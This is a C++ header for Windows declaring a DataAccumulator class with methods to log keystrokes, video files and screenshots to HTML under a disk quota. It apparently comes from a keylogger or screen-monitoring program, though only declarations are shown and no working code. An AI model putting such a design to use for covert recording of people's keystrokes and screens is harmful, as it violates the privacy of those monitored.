#pragma once
#include <Windows.h>

class DataAccumulator
{
private:
	// Specifies maximum disk space to use by the program
	int mDiskQuota;
	//PSYSTEMTIME mLastLogTime;
	PFILETIME mLastLogTime;
	int GetElapsedSecondsFromLastLog();
	void Log2HTML(PSTR htmlString);
public:
	DataAccumulator(void);
	~DataAccumulator(void);
	void SetDiskQuota(int quota) { mDiskQuota = quota;}
	void LogKey(PWSTR key);
	void LogVideo(PTSTR videoFile);
	void LogPrintScreen(PTSTR imageFile);
};

